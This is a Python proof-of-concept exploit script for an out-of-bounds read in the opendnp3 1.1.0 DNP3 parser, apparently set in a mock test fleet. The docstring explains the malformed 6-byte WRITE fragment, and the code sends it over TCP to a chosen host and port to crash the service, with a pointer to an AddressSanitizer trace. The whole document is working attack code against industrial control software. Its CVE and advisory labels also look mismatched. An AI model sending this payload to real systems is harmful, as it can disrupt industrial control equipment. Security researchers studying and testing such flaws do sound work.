#!/usr/bin/env python3
"""
PoC for the opendnp3 1.1.0 APDU 1-byte-count object over-read (CWE-125),
tracked in this mock fleet as CVE-2019-18996 (ICSA-13-291-01 "aegis" family).

The fragment is a DNP3 application APDU:
    C0          application control (FIR=1, FIN=1, seq=0)
    02          function code 0x02 = WRITE (has_data = true)
    14 00       object: group 20 (counter), variation 0 (placeholder / var-0)
    07          qualifier 0x07 = QC_1B_CNT (1-byte count)
    01          count = 1, NO object payload

The placeholder object's data_size validates as 0, so the count header passes
the length guard; APDU::GetNumObjects() returns the attacker count and the
ObjectReadIterator (count path, CalcCountIndex) yields an object whose data
pointer runs past the fragment -> ASan heap-buffer-overflow. Distinct parse
path from the range PoC (CountHeader / CalcCountIndex vs RangedHeader).

Usage: poc_cve_2019_18996.py [host] [port]
"""
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 20000

frag = bytes([0xC0, 0x02, 0x14, 0x00, 0x07, 0x01])

print(f"[*] Connecting to {host}:{port}")
s = socket.create_connection((host, port), timeout=5)
print(f"[*] Sending {len(frag)}-byte DNP3 fragment: {frag.hex()}")
s.sendall(frag)
try:
    s.shutdown(socket.SHUT_WR)
except OSError:
    pass
try:
    data = s.recv(256)
    print(f"[*] Server response: {data!r}")
except OSError as e:
    print(f"[*] Connection closed/reset (expected on crash): {e}")
s.close()
print("[*] Done. Check `docker logs` for the ASan heap-buffer-overflow trace.")
